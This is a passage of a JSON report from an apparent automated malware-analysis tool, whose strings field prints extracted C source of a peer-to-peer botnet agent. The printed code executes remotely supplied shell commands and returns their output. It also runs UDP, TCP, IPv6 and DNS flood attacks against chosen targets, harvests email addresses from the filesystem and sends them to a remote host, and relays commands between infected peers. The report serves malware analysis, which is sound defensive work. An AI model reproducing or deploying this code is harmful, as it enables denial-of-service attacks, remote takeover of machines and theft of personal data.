            "\t\t\t\t\tcase 0x24: { // Run a command",
            "\t\t\t\t\t\tFILE *f;",
            "\t\t\t\t\t\tstruct sh_rec *sr=(struct sh_rec *)buf;",
            "\t\t\t\t\t\tint id;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct sh_rec)+sr->h.len || sr->h.len > 2999-sizeof(struct sh_rec)) break;",
            "\t\t\t\t\t\tid=sr->h.id;",
            "\t\t\t\t\t\t(buf+sizeof(struct sh_rec))[sr->h.len]=0;",
            "\t\t\t\t\t\t_decrypt(buf+sizeof(struct sh_rec),sr->h.len);",
            "\t\t\t\t\t\tf=popen(buf+sizeof(struct sh_rec),\"r\");",
            "\t\t\t\t\t\tif (f != NULL) {",
            "\t\t\t\t\t\t\twhile(1) {",
            "\t\t\t\t\t\t\t\tstruct data_rec rc;",
            "\t\t\t\t\t\t\t\tchar *str;",
            "\t\t\t\t\t\t\t\tunsigned long len;",
            "\t\t\t\t\t\t\t\tmemset(buf,0,3000);",
            "\t\t\t\t\t\t\t\tfgets(buf,3000,f);",
            "\t\t\t\t\t\t\t\tif (feof(f)) break;",
            "\t\t\t\t\t\t\t\tlen=strlen(buf);",
            "\t\t\t\t\t\t\t\tmemset((void*)&rc,0,sizeof(struct data_rec));",
            "\t\t\t\t\t\t\t\trc.h.tag=0x41;",
            "\t\t\t\t\t\t\t\trc.h.seq=newseq();",
            "\t\t\t\t\t\t\t\trc.h.id=id;",
            "\t\t\t\t\t\t\t\trc.h.len=len;",
            "\t\t\t\t\t\t\t\t_encrypt(buf,len);",
            "\t\t\t\t\t\t\t\tstr=(char*)malloc(sizeof(struct data_rec)+len);",
            "\t\t\t\t\t\t\t\tif (str == NULL) break;",
            "\t\t\t\t\t\t\t\tmemcpy((void*)str,(void*)&rc,sizeof(struct data_rec));",
            "\t\t\t\t\t\t\t\tmemcpy((void*)(str+sizeof(struct data_rec)),buf,len);",
            "\t\t\t\t\t\t\t\trelayclient(&udpclient,str,sizeof(struct data_rec)+len);",
            "\t\t\t\t\t\t\t\tFREE(str);",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tpclose(f);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\telse senderror(&udpclient,id,\"Unable to execute command\");",
            "\t\t\t\t\t\t} break;",
            "#endif",
            "\t\t\t\t\tcase 0x25: {",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x26: { // Route",
            "\t\t\t\t\t\tstruct route_rec *rp=(struct route_rec *)buf;",
            "\t\t\t\t\t\tunsigned long i;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct route_rec)) break;",
            "\t\t\t\t\t\tif (!useseq(rp->h.seq)) {",
            "\t\t\t\t\t\t\taddseq(rp->h.seq);",
            "\t\t\t\t\t\t\taudp_send(&udpclient,(char*)&ll,sizeof(struct llheader));",
            "\t\t\t\t\t\t\tif (rp->sync == 1 && rp->links != numlinks) {",
            "\t\t\t\t\t\t\t\tif (time(NULL)-synctime > 60) {",
            "\t\t\t\t\t\t\t\t\tif (rp->links > numlinks) {",
            "\t\t\t\t\t\t\t\t\t\tmemset((void*)&initrec,0,sizeof(struct initsrv_rec));",
            "\t\t\t\t\t\t\t\t\t\tinitrec.h.tag=0x72;",
            "\t\t\t\t\t\t\t\t\t\tinitrec.h.len=0;",
            "\t\t\t\t\t\t\t\t\t\tinitrec.h.id=0;",
            "\t\t\t\t\t\t\t\t\t\trelayclient(&udpclient,(char*)&initrec,sizeof(struct initsrv_rec));",
            "\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\telse syncm(&udpclient,0x71,0);",
            "\t\t\t\t\t\t\t\t\tsynctime=time(NULL);",
            "\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tif (rp->sync != 3) {",
            "\t\t\t\t\t\t\t\trp->sync=1;",
            "\t\t\t\t\t\t\t\trp->links=numlinks;",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tif (rp->server == -1 || rp->server == 0 || rp->server == myip) relay(inet_addr(\"127.0.0.1\"),buf+sizeof(struct route_rec),rp->h.len-sizeof(struct route_rec));",
            "\t\t\t\t\t\t\tif (rp->server == -1 || rp->server == 0) segment(2,buf,rp->h.len);",
            "\t\t\t\t\t\t\telse if (rp->server != myip) {",
            "\t\t\t\t\t\t\t\tif (rp->hops == 0 || rp->hops > 16) relay(rp->server,buf,rp->h.len);",
            "\t\t\t\t\t\t\t\telse {",
            "\t\t\t\t\t\t\t\t\trp->hops--;",
            "\t\t\t\t\t\t\t\t\tsegment(2,buf,rp->h.len);",
            "\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tfor (i=LINKS;i>0;i--) memcpy((struct route_table*)&routes[i],(struct route_table*)&routes[i-1],sizeof(struct route_table));",
            "\t\t\t\t\t\t\tmemset((struct route_table*)&routes[0],0,sizeof(struct route_table));",
            "\t\t\t\t\t\t\troutes[0].id=rp->h.id;",
            "\t\t\t\t\t\t\troutes[0].ip=udpclient.in.sin_addr.s_addr;",
            "\t\t\t\t\t\t\troutes[0].port=htons(udpclient.in.sin_port);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x27: {",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x28: { // List",
            "\t\t\t\t\t\tstruct list_rec *rp=(struct list_rec *)buf;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct list_rec)) break;",
            "\t\t\t\t\t\tsyncm(&udpclient,0x46,rp->h.id);",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x29: { // Udp flood",
            "\t\t\t\t\t\tint flag=1,fd,i=0;",
            "\t\t\t\t\t\tchar *str;",
            "\t\t\t\t\t\tstruct sockaddr_in in;",
            "\t\t\t\t\t\ttime_t start=time(NULL);",
            "\t\t\t\t\t\tstruct udp_rec *rp=(struct udp_rec *)buf;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct udp_rec)) break;",
            "\t\t\t\t\t\tif (rp->size > 9216) {",
            "\t\t\t\t\t\t\tsenderror(&udpclient,rp->h.id,\"Size must be less than or equal to 9216\\n\");",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\tif (!isreal(rp->target)) {",
            "\t\t\t\t\t\t\tsenderror(&udpclient,rp->h.id,\"Cannot packet local networks\\n\");",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\tif (waitforqueues()) break;",
            "\t\t\t\t\t\tstr=(char*)malloc(rp->size);",
            "\t\t\t\t\t\tif (str == NULL) break;",
            "\t\t\t\t\t\tfor (i=0;i<rp->size;i++) str[i]=rand();",
            "\t\t\t\t\t\tmemset((void*)&in,0,sizeof(struct sockaddr_in));",
            "\t\t\t\t\t\tin.sin_addr.s_addr=rp->target;",
            "\t\t\t\t\t\tin.sin_family=AF_INET;",
            "\t\t\t\t\t\tin.sin_port=htons(rp->port);",
            "\t\t\t\t\t\twhile(1) {",
            "\t\t\t\t\t\t\tif (rp->port == 0) in.sin_port = rand();",
            "\t\t\t\t\t\t\tif ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);",
            "\t\t\t\t\t\t\telse {",
            "\t\t\t\t\t\t\t\tflag = fcntl(fd, F_GETFL, 0);",
            "\t\t\t\t\t\t\t\tflag |= O_NONBLOCK;",
            "\t\t\t\t\t\t\t\tfcntl(fd, F_SETFL, flag);",
            "\t\t\t\t\t\t\t\tsendto(fd,str,rp->size,0,(struct sockaddr*)&in,sizeof(in));",
            "\t\t\t\t\t\t\t\tclose(fd);",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tif (i >= 50) {",
            "\t\t\t\t\t\t\t\tif (time(NULL) >= start+rp->secs) exit(0);",
            "\t\t\t\t\t\t\t\ti=0;",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\ti++;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\tFREE(str);",
            "\t\t\t\t\t\t} exit(0);",
            "\t\t\t\t\tcase 0x2A: { // Tcp flood",
            "\t\t\t\t\t\tint flag=1,fd,i=0;",
            "\t\t\t\t\t\tstruct sockaddr_in in;",
            "\t\t\t\t\t\ttime_t start=time(NULL);",
            "\t\t\t\t\t\tstruct tcp_rec *rp=(struct tcp_rec *)buf;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct tcp_rec)) break;",
            "\t\t\t\t\t\tif (!isreal(rp->target)) {",
            "\t\t\t\t\t\t\tsenderror(&udpclient,rp->h.id,\"Cannot packet local networks\\n\");",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\tif (waitforqueues()) break;",
            "\t\t\t\t\t\tmemset((void*)&in,0,sizeof(struct sockaddr_in));",
            "\t\t\t\t\t\tin.sin_addr.s_addr=rp->target;",
            "\t\t\t\t\t\tin.sin_family=AF_INET;",
            "\t\t\t\t\t\tin.sin_port=htons(rp->port);",
            "\t\t\t\t\t\twhile(1) {",
            "\t\t\t\t\t\t\tif (rp->port == 0) in.sin_port = rand();",
            "\t\t\t\t\t\t\tif ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);",
            "\t\t\t\t\t\t\telse {",
            "\t\t\t\t\t\t\t\tflag = fcntl(fd, F_GETFL, 0);",
            "\t\t\t\t\t\t\t\tflag |= O_NONBLOCK;",
            "\t\t\t\t\t\t\t\tfcntl(fd, F_SETFL, flag);",
            "\t\t\t\t\t\t\t\tconnect(fd, (struct sockaddr *)&in, sizeof(in));",
            "\t\t\t\t\t\t\t\tclose(fd);",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tif (i >= 50) {",
            "\t\t\t\t\t\t\t\tif (time(NULL) >= start+rp->secs) exit(0);",
            "\t\t\t\t\t\t\t\ti=0;",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\ti++;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} exit(0);",
            "#ifndef NOIPV6",
            "\t\t\t\t\tcase 0x2B: { // IPv6 Tcp flood",
            "\t\t\t\t\t\tint flag=1,fd,i=0,j=0;",
            "\t\t\t\t\t\tstruct sockaddr_in6 in;",
            "\t\t\t\t\t\ttime_t start=time(NULL);",
            "\t\t\t\t\t\tstruct tcp6_rec *rp=(struct tcp6_rec *)buf;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct tcp6_rec)) break;",
            "\t\t\t\t\t\tif (waitforqueues()) break;",
            "\t\t\t\t\t\tmemset((void*)&in,0,sizeof(struct sockaddr_in6));",
            "\t\t\t\t\t\tfor (i=0;i<4;i++) for (j=0;j<4;j++) ((char*)&in.sin6_addr.s6_addr[i])[j]=((char*)&rp->target[i])[j];",
            "\t\t\t\t\t\tin.sin6_family=AF_INET6;",
            "\t\t\t\t\t\tin.sin6_port=htons(rp->port);",
            "\t\t\t\t\t\twhile(1) {",
            "\t\t\t\t\t\t\tif (rp->port == 0) in.sin6_port = rand();",
            "\t\t\t\t\t\t\tif ((fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP)) < 0);",
            "\t\t\t\t\t\t\telse {",
            "\t\t\t\t\t\t\t\tflag = fcntl(fd, F_GETFL, 0);",
            "\t\t\t\t\t\t\t\tflag |= O_NONBLOCK;",
            "\t\t\t\t\t\t\t\tfcntl(fd, F_SETFL, flag);",
            "\t\t\t\t\t\t\t\tconnect(fd, (struct sockaddr *)&in, sizeof(in));",
            "\t\t\t\t\t\t\t\tclose(fd);",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tif (i >= 50) {",
            "\t\t\t\t\t\t\t\tif (time(NULL) >= start+rp->secs) exit(0);",
            "\t\t\t\t\t\t\t\ti=0;",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\ti++;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} exit(0);",
            "#endif",
            "\t\t\t\t\tcase 0x2C: { // Dns flood",
            "\t\t\t\t\t\tstruct dns {",
            "\t\t\t\t\t\t\tunsigned short int id;",
            "\t\t\t\t\t\t\tunsigned char  rd:1;",
            "\t\t\t\t\t\t\tunsigned char  tc:1;",
            "\t\t\t\t\t\t\tunsigned char  aa:1;",
            "\t\t\t\t\t\t\tunsigned char  opcode:4;",
            "\t\t\t\t\t\t\tunsigned char  qr:1;",
            "\t\t\t\t\t\t\tunsigned char  rcode:4;",
            "\t\t\t\t\t\t\tunsigned char  unused:2;",
            "\t\t\t\t\t\t\tunsigned char  pr:1;",
            "\t\t\t\t\t\t\tunsigned char  ra:1;",
            "\t\t\t\t\t\t\tunsigned short int que_num;",
            "\t\t\t\t\t\t\tunsigned short int rep_num;",
            "\t\t\t\t\t\t\tunsigned short int num_rr;",
            "\t\t\t\t\t\t\tunsigned short int num_rrsup;",
            "\t\t\t\t\t\t\tchar buf[128];",
            "\t\t\t\t\t\t} dnsp;",
            "\t\t\t\t\t\tunsigned long len=0,i=0,startm;",
            "\t\t\t\t\t\tint fd,flag;",
            "\t\t\t\t\t\tchar *convo;",
            "\t\t\t\t\t\tstruct sockaddr_in in;",
            "\t\t\t\t\t\tstruct df_rec *rp=(struct df_rec *)buf;",
            "\t\t\t\t\t\ttime_t start=time(NULL);",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct df_rec)+rp->h.len || rp->h.len > 2999-sizeof(struct df_rec)) break;",
            "\t\t\t\t\t\tif (!isreal(rp->target)) {",
            "\t\t\t\t\t\t\tsenderror(&udpclient,rp->h.id,\"Cannot packet local networks\\n\");",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\tif (waitforqueues()) break;",
            "\t\t\t\t\t\tmemset((void*)&in,0,sizeof(struct sockaddr_in));",
            "\t\t\t\t\t\tin.sin_addr.s_addr=rp->target;",
            "\t\t\t\t\t\tin.sin_family=AF_INET;",
            "\t\t\t\t\t\tin.sin_port=htons(53);",
            "\t\t\t\t\t\tdnsp.rd=1;",
            "\t\t\t\t\t\tdnsp.tc=0;",
            "\t\t\t\t\t\tdnsp.aa=0;",
            "\t\t\t\t\t\tdnsp.opcode=0;",
            "\t\t\t\t\t\tdnsp.qr=0;",
            "\t\t\t\t\t\tdnsp.rcode=0;",
            "\t\t\t\t\t\tdnsp.unused=0;",
            "\t\t\t\t\t\tdnsp.pr=0;",
            "\t\t\t\t\t\tdnsp.ra=0;",
            "\t\t\t\t\t\tdnsp.que_num=256;",
            "\t\t\t\t\t\tdnsp.rep_num=0;",
            "\t\t\t\t\t\tdnsp.num_rr=0;",
            "\t\t\t\t\t\tdnsp.num_rrsup=0;",
            "\t\t\t\t\t\tconvo=buf+sizeof(struct df_rec);",
            "\t\t\t\t\t\tconvo[rp->h.len]=0;",
            "\t\t\t\t\t\t_decrypt(convo,rp->h.len);",
            "\t\t\t\t\t\tfor (i=0,startm=0;i<=rp->h.len;i++) if (convo[i] == '.' || convo[i] == 0) {",
            "\t\t\t\t\t\t\tconvo[i]=0;",
            "\t\t\t\t\t\t\tsprintf(dnsp.buf+len,\"%c%s\",(unsigned char)(i-startm),convo+startm);",
            "\t\t\t\t\t\t\tlen+=1+strlen(convo+startm);",
            "\t\t\t\t\t\t\tstartm=i+1;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\tdnsp.buf[len++]=0;",
            "\t\t\t\t\t\tdnsp.buf[len++]=0;",
            "\t\t\t\t\t\tdnsp.buf[len++]=1;",
            "\t\t\t\t\t\tdnsp.buf[len++]=0;",
            "\t\t\t\t\t\tdnsp.buf[len++]=1;",
            "\t\t\t\t\t\twhile(1) {",
            "\t\t\t\t\t\t\tdnsp.id=rand();",
            "\t\t\t\t\t\t\tif ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);",
            "\t\t\t\t\t\t\telse {",
            "\t\t\t\t\t\t\t\tflag = fcntl(fd, F_GETFL, 0);",
            "\t\t\t\t\t\t\t\tflag |= O_NONBLOCK;",
            "\t\t\t\t\t\t\t\tfcntl(fd, F_SETFL, flag);",
            "\t\t\t\t\t\t\t\tsendto(fd,(char*)&dnsp,sizeof(struct dns)+len-128,0,(struct sockaddr*)&in,sizeof(in));",
            "\t\t\t\t\t\t\t\tclose(fd);",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tif (i >= 50) {",
            "\t\t\t\t\t\t\t\tif (time(NULL) >= start+rp->secs) exit(0);",
            "\t\t\t\t\t\t\t\ti=0;",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\ti++;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} exit(0);",
            "\t\t\t\t\tcase 0x2D: { // Email scan",
            "\t\t\t\t\t\tchar ip[256];",
            "\t\t\t\t\t\tstruct escan_rec *rp=(struct escan_rec *)buf;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct escan_rec)) break;",
            "\t\t\t\t\t\tif (!isreal(rp->ip)) {",
            "\t\t\t\t\t\t\tsenderror(&udpclient,rp->h.id,\"Invalid IP\\n\");",
            "\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\tconv(ip,256,rp->ip);",
            "\t\t\t\t\t\tif (mfork() == 0) {",
            "\t\t\t\t\t\t\tstruct _linklist *getb;",
            "\t\t\t\t\t\t\tstruct ainst client;",
            "\t\t\t\t\t\t\tStartScan(\"/\");",
            "\t\t\t\t\t\t\taudp_setup(&client,(char*)ip,ESCANPORT);",
            "\t\t\t\t\t\t\tgetb=linklist;",
            "\t\t\t\t\t\t\twhile(getb != NULL) {",
            "\t\t\t\t\t\t\t\tunsigned long len=strlen(getb->name);",
            "\t\t\t\t\t\t\t\taudp_send(&client,getb->name,len);",
            "\t\t\t\t\t\t\t\tgetb=getb->next;",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\taudp_close(&client);",
            "\t\t\t\t\t\t\texit(0);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x70: { // Incomming client",
            "\t\t\t\t\t\tstruct {",
            "\t\t\t\t\t\t\tstruct addsrv_rec a;",
            "\t\t\t\t\t\t\tunsigned long server;",
            "\t\t\t\t\t\t} rc;",
            "\t\t\t\t\t\tstruct myip_rec rp;",
            "\t\t\t\t\t\tif (!isreal(udpclient.in.sin_addr.s_addr)) break;",
            "\t\t\t\t\t\tsyncmode(3);",
            "\t\t\t\t\t\tmemset((void*)&rp,0,sizeof(struct myip_rec));",
            "\t\t\t\t\t\trp.h.tag=0x73;",
            "\t\t\t\t\t\trp.h.id=0;",
            "\t\t\t\t\t\trp.ip=udpclient.in.sin_addr.s_addr;",
            "\t\t\t\t\t\trelayclient(&udpclient,(void*)&rp,sizeof(struct myip_rec));",
            "\t\t\t\t\t\tmemset((void*)&rc,0,sizeof(rc));",
            "\t\t\t\t\t\trc.a.h.tag=0x71;",
            "\t\t\t\t\t\trc.a.h.id=0;",
            "\t\t\t\t\t\trc.a.h.len=sizeof(unsigned long);",
            "\t\t\t\t\t\trc.server=udpclient.in.sin_addr.s_addr;",
            "\t\t\t\t\t\tbroadcast((void*)&rc,sizeof(rc));",
            "\t\t\t\t\t\tsyncmode(1);",
            "\t\t\t\t\t\taddserver(rc.server);",
            "\t\t\t\t\t\tsyncm(&udpclient,0x71,0);",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x71: { // Receive the list",
            "\t\t\t\t\t\tstruct addsrv_rec *rp=(struct addsrv_rec *)buf;",
            "\t\t\t\t\t\tstruct next_rec { unsigned long server; };",
            "\t\t\t\t\t\tunsigned long a;",
            "\t\t\t\t\t\tchar b=0;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct addsrv_rec)) break;",
            "\t\t\t\t\t\tfor (a=0;rp->h.len > a*sizeof(struct next_rec) && udpserver.len > sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec));a++) {",
            "\t\t\t\t\t\t\tstruct next_rec *fc=(struct next_rec*)(buf+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec)));",
            "\t\t\t\t\t\t\taddserver(fc->server);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\tfor (a=0;a<numlinks;a++) if (links[a] == udpclient.in.sin_addr.s_addr) b=1;",
            "\t\t\t\t\t\tif (!b && isreal(udpclient.in.sin_addr.s_addr)) {",
            "\t\t\t\t\t\t\tstruct myip_rec rp;",
            "\t\t\t\t\t\t\tmemset((void*)&rp,0,sizeof(struct myip_rec));",
            "\t\t\t\t\t\t\trp.h.tag=0x73;",
            "\t\t\t\t\t\t\trp.h.id=0;",
            "\t\t\t\t\t\t\trp.ip=udpclient.in.sin_addr.s_addr;",
            "\t\t\t\t\t\t\trelayclient(&udpclient,(void*)&rp,sizeof(struct myip_rec));",
            "\t\t\t\t\t\t\taddserver(udpclient.in.sin_addr.s_addr);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x72: { // Send the list",
            "\t\t\t\t\t\tsyncm(&udpclient,0x71,0);",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x73: { // Get my IP",
            "\t\t\t\t\t\tstruct myip_rec *rp=(struct myip_rec *)buf;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct myip_rec)) break;",
            "\t\t\t\t\t\tif (!myip && isreal(rp->ip)) {",
            "\t\t\t\t\t\t\tmyip=rp->ip;",
            "\t\t\t\t\t\t\taddserver(rp->ip);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x74: { // Transmit their IP",
            "\t\t\t\t\t\tstruct myip_rec rc;",
            "\t\t\t\t\t\tmemset((void*)&rc,0,sizeof(struct myip_rec));",
            "\t\t\t\t\t\trc.h.tag=0x73;",
            "\t\t\t\t\t\trc.h.id=0;",
            "\t\t\t\t\t\trc.ip=udpclient.in.sin_addr.s_addr;",
            "\t\t\t\t\t\tif (!isreal(rc.ip)) break;",
            "\t\t\t\t\t\trelayclient(&udpclient,(void*)&rc,sizeof(struct myip_rec));",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t\tcase 0x41:   //  --|",
            "\t\t\t\t\tcase 0x42:   //    |",
            "\t\t\t\t\tcase 0x43:   //    |",
            "\t\t\t\t\tcase 0x44:   //    |---> Relay to client",
            "\t\t\t\t\tcase 0x45:   //    |",
            "\t\t\t\t\tcase 0x46:   //    |",
            "\t\t\t\t\tcase 0x47: { //  --|",
            "\t\t\t\t\t\tunsigned long a;",
            "\t\t\t\t\t\tstruct header *rc=(struct header *)buf;",
            "\t\t\t\t\t\tif (udpserver.len < sizeof(struct header)) break;",
            "\t\t\t\t\t\tif (!useseq(rc->seq)) {",
            "\t\t\t\t\t\t\taddseq(rc->seq);",
            "\t\t\t\t\t\t\tfor (a=0;a<LINKS;a++) if (routes[a].id == rc->id) {",
            "\t\t\t\t\t\t\t\tstruct ainst ts;",
            "\t\t\t\t\t\t\t\tchar srv[256];",
            "\t\t\t\t\t\t\t\tconv(srv,256,routes[a].ip);",
            "\t\t\t\t\t\t\t\taudp_relay(&udpserver,&ts,srv,routes[a].port);",
            "\t\t\t\t\t\t\t\trelayclient(&ts,buf,udpserver.len);",
            "\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} break;",
            "\t\t\t\t}",
            "\t\t\t}",
            "\taudp_close(&udpserver);",
            "\treturn 0;"
        ],
        "file": {},
        "fuzzing": {
            "String too long": [
                "//////////////////////////////////////////////////////////////////////////////////////"
            ]
        },
        "ip": [
            "127.0.0.1"
        ],
        "url": []
    },
    "time": "0:00:00.765033",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
